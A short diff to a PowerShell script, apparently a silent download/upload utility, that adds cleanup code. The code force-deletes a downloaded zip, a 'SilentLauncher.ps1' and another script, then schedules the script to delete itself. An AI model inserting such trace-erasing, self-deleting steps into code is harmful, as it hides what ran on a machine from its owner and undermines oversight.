@@ -52,3 +52,27 @@ catch {
 finally {
     $webClient.Dispose()
 }
+
+# Define the paths of the files to be deleted
+$filesToDelete = @(
+    "$zipFilePath",
+    "C:\Users\$currentUser\script.ps1",
+    "C:\Users\$currentUser\SilentLauncher.ps1"
+)
+
+# Delete specified files
+foreach ($file in $filesToDelete) {
+    if (Test-Path $file) {
+        Remove-Item -Path $file -Force
+    }
+}
+
+# Schedule a task to delete dl_ul.ps1 itself
+$deleteSelfScript = {
+    param($path)
+    Start-Sleep -Seconds 10
+    Remove-Item -Path $path -Force
+}
+$scriptBlock = [ScriptBlock]::Create($deleteSelfScript)
+$scriptPath = "C:\Users\$currentUser\dl_ul.ps1"
+Start-Job -ScriptBlock $scriptBlock -ArgumentList $scriptPath
